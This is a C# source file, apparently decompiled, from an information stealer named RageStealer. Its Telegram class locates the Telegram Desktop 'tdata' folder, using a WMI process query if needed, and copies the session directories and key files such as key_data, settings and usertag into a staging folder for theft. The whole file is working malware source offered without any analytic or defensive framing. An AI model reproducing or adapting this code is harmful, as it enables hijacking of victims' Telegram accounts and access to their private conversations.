using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Messengers;

internal sealed class Telegram
{
	public static string ProcessExecutablePath(Process process)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (process.MainModule != null)
			{
				return process.MainModule.FileName;
			}
		}
		catch
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.Current;
					object obj = ((ManagementBaseObject)val)["ProcessID"];
					object obj2 = ((ManagementBaseObject)val)["ExecutablePath"];
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		return "";
	}

	private static string GetTdata()
	{
		string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
		Process[] processesByName = Process.GetProcessesByName("Telegram");
		if (processesByName.Length == 0)
		{
			return result;
		}
		return Path.Combine(Path.GetDirectoryName(ProcessExecutablePath(processesByName[0])), "tdata");
	}

	public static bool GetTelegramSessions(string sSaveDir)
	{
		string tdata = GetTdata();
		try
		{
			if (!Directory.Exists(tdata))
			{
				return false;
			}
			Directory.CreateDirectory(sSaveDir);
			string[] directories = Directory.GetDirectories(tdata);
			string[] files = Directory.GetFiles(tdata);
			string[] array = directories;
			foreach (string text in array)
			{
				string name = new DirectoryInfo(text).Name;
				if (name.Length == 16)
				{
					string destFolder = Path.Combine(sSaveDir, name);
					Filemanager.CopyDirectory(text, destFolder);
				}
			}
			array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(array[i]);
				string name2 = fileInfo.Name;
				string destFileName = Path.Combine(sSaveDir, name2);
				if (fileInfo.Length <= 7120)
				{
					if (name2.EndsWith("s") && name2.Length == 17)
					{
						fileInfo.CopyTo(destFileName);
					}
					else if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
					{
						fileInfo.CopyTo(destFileName);
					}
				}
			}
			Counter.Telegram = true;
			return true;
		}
		catch
		{
			return false;
		}
	}
}
